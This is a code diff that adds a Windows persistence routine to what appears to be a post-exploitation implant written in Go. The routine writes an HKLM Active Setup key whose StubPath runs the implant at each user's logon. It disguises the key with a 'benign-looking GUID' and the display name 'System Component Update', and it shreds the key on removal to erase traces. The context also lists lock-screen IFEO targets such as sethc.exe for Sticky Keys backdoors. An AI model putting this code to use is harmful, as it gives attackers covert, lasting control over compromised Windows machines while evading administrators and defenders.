@@ -141,6 +141,59 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 	}
 }
 
+// persistActiveSetup installs/removes Active Setup persistence (T1547.014).
+// Active Setup runs StubPath commands once per user at first logon. Survives
+// profile resets. Requires admin to write to HKLM.
+func persistActiveSetup(args persistArgs) structs.CommandResult {
+	if args.Name == "" {
+		args.Name = "{A9E1B7F2-3D4C-5E6F-7A8B-9C0D1E2F3A4B}" // benign-looking GUID
+	}
+
+	activeSetupBase := `SOFTWARE\Microsoft\Active Setup\Installed Components`
+	keyPath := activeSetupBase + `\` + args.Name
+
+	switch strings.ToLower(args.Action) {
+	case "install":
+		if args.Path == "" {
+			exe, err := os.Executable()
+			if err != nil {
+				return errorf("Error getting executable path: %v", err)
+			}
+			args.Path = exe
+		}
+
+		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
+		if err != nil {
+			return errorf("Error creating HKLM\\%s: %v (admin required)", keyPath, err)
+		}
+		defer key.Close()
+
+		// Set display name (appears in registry as default value)
+		_ = key.SetStringValue("", "System Component Update")
+
+		// Set StubPath (the command that runs at user logon)
+		if err := key.SetStringValue("StubPath", args.Path); err != nil {
+			return errorf("Error setting StubPath: %v", err)
+		}
+
+		// Set Version to force re-execution (increment to re-trigger for existing users)
+		if err := key.SetStringValue("Version", "1,0,0,1"); err != nil {
+			return errorf("Error setting Version: %v", err)
+		}
+
+		return successf("Installed Active Setup persistence:\n  Key:       HKLM\\%s\n  StubPath:  %s\n  Version:   1,0,0,1\n  Trigger:   Runs once per user at first logon\n  Note:      Requires admin. Survives profile resets. To re-trigger, increment Version.", keyPath, args.Path)
+
+	case "remove":
+		// Shred and delete the Active Setup entry
+		shredRegistryKey(registry.LOCAL_MACHINE, keyPath)
+
+		return successf("Removed Active Setup persistence (shredded):\n  Key: HKLM\\%s", keyPath)
+
+	default:
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+	}
+}
+
 // ifeoTargets are common IFEO targets accessible from the Windows lock screen.
 var ifeoTargets = [][2]string{
 	{"sethc.exe", "Sticky Keys (5x Shift at lock screen)"},
